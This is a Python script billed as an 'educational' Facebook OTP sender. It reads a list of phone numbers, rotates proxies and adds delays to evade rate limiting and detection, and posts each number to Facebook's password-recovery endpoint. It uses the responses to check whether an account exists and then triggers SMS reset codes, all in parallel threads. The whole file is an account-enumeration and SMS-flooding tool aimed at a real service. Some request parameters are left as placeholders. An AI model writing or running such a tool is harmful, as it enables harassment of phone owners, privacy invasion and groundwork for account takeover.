#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Facebook OTP Sender Tool (Educational Purpose Only)
- Reads phone numbers from file
- Uses proxies to avoid rate limiting
- Checks if account exists
- Sends OTP if account found
"""

import requests
import time
import random
import threading
import logging
import sys
from queue import Queue
from datetime import datetime

# ==================== CONFIGURATION ====================
NUMBERS_FILE = "numbers.txt"           # File with numbers (one per line)
PROXY_FILE = "proxies.txt"             # File with proxies (one per line, format: http://user:pass@ip:port)
THREADS = 5                            # Number of concurrent threads
DELAY_BETWEEN_REQUESTS = 2              # Seconds between requests (to avoid detection)
TIMEOUT = 10                            # Request timeout
MAX_RETRIES = 3                         # Retry on network error
USER_AGENT = "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36"

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, proxy_file):
        self.proxies = []
        self.load_proxies(proxy_file)
    
    def load_proxies(self, file):
        try:
            with open(file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(self.proxies)} proxies")
        except FileNotFoundError:
            logger.warning(f"Proxy file {file} not found. Running without proxies.")
            self.proxies = []
    
    def get_random_proxy(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)

# ==================== FACEBOOK API SIMULATION ====================
# Real endpoints need to be discovered using browser dev tools.
# These are examples from Facebook's "Forgot Password" flow.
# You may need to update them based on actual requests.

CHECK_ACCOUNT_URL = "https://www.facebook.com/recover/initiate/"
SEND_OTP_URL = "https://www.facebook.com/recover/initiate/"  # Same endpoint with different params

def check_account(session, number, proxy):
    """
    Check if phone number is registered with Facebook.
    Returns True if account exists, False otherwise.
    """
    # Simulate a POST request with necessary data
    # Real implementation would require extracting fb_dtsg, lsd, etc.
    data = {
        "email": number,           # Phone number can be used as email
        "did_submit": "Search",
        # additional params like fb_dtsg, jazoest, etc.
    }
    try:
        r = session.post(CHECK_ACCOUNT_URL, data=data, proxies=proxy, timeout=TIMEOUT)
        if r.status_code == 200:
            # Check response text for indicators
            if "We couldn't find an account with that email address" in r.text:
                return False
            elif "Enter the code from your authenticator app" in r.text:
                # Account exists and has 2FA
                return True
            elif "Reset Your Password" in r.text:
                # Account exists, can reset
                return True
            else:
                # Fallback: maybe account exists
                return True
        else:
            logger.error(f"Check account returned status {r.status_code}")
            return None
    except Exception as e:
        logger.error(f"Network error during check: {e}")
        return None

def send_otp(session, number, proxy):
    """
    Trigger OTP sending to the phone number.
    Returns True if OTP sent successfully.
    """
    # This might be the same endpoint with different action
    data = {
        "email": number,
        "did_send": "Send Code via SMS",
        # additional params
    }
    try:
        r = session.post(SEND_OTP_URL, data=data, proxies=proxy, timeout=TIMEOUT)
        if r.status_code == 200:
            # Check for success message
            if "A code was sent to your phone" in r.text:
                return True
            else:
                return False
        else:
            logger.error(f"Send OTP returned status {r.status_code}")
            return False
    except Exception as e:
        logger.error(f"Network error during OTP send: {e}")
        return False

# ==================== WORKER FUNCTION ====================
def worker(proxy_manager, number_queue, results):
    """
    Worker thread: takes numbers from queue, processes them.
    """
    session = requests.Session()
    session.headers.update({'User-Agent': USER_AGENT})
    
    while not number_queue.empty():
        number = number_queue.get()
        proxy = proxy_manager.get_random_proxy()
        proxy_dict = {"http": proxy, "https": proxy} if proxy else None
        
        logger.info(f"Scanning Number: {number}")
        
        for attempt in range(MAX_RETRIES):
            try:
                exists = check_account(session, number, proxy_dict)
                if exists is None:
                    # Network error, retry
                    logger.error(f"Network Error, retrying {attempt+1}/{MAX_RETRIES}")
                    time.sleep(DELAY_BETWEEN_REQUESTS * 2)
                    continue
                elif exists:
                    logger.info(f"Account Found: {number}")
                    # Now send OTP
                    otp_sent = send_otp(session, number, proxy_dict)
                    if otp_sent:
                        logger.info(f"Sss Send Success: {number}")
                        results.append(('success', number))
                    else:
                        logger.error(f"Sss Send Failed: {number}")
                        results.append(('send_fail', number))
                else:
                    logger.info(f"Account Not Found: {number}")
                    results.append(('not_found', number))
                break  # exit retry loop
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                time.sleep(DELAY_BETWEEN_REQUESTS)
        
        time.sleep(DELAY_BETWEEN_REQUESTS)
        number_queue.task_done()

# ==================== MAIN FUNCTION ====================
def main():
    # Load numbers
    try:
        with open(NUMBERS_FILE, 'r') as f:
            numbers = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(numbers)} numbers")
    except FileNotFoundError:
        logger.error(f"Numbers file '{NUMBERS_FILE}' not found.")
        sys.exit(1)
    
    # Initialize proxy manager
    proxy_manager = ProxyManager(PROXY_FILE)
    
    # Create queue
    number_queue = Queue()
    for num in numbers:
        number_queue.put(num)
    
    # Results list
    results = []
    
    # Start threads
    threads = []
    for _ in range(min(THREADS, len(numbers))):
        t = threading.Thread(target=worker, args=(proxy_manager, number_queue, results))
        t.start()
        threads.append(t)
    
    # Wait for all threads
    for t in threads:
        t.join()
    
    # Summary
    logger.info("="*50)
    logger.info("Scanning completed. Summary:")
    success = [r for r in results if r[0]=='success']
    not_found = [r for r in results if r[0]=='not_found']
    send_fail = [r for r in results if r[0]=='send_fail']
    logger.info(f"Total: {len(results)}")
    logger.info(f"Success (OTP sent): {len(success)}")
    logger.info(f"Account Not Found: {len(not_found)}")
    logger.info(f"Send Failed: {len(send_fail)}")
    
    # Save results to file
    with open("results.txt", "w") as f:
        for status, num in results:
            f.write(f"{status}: {num}\n")
    logger.info("Results saved to results.txt")

if __name__ == "__main__":
    main()
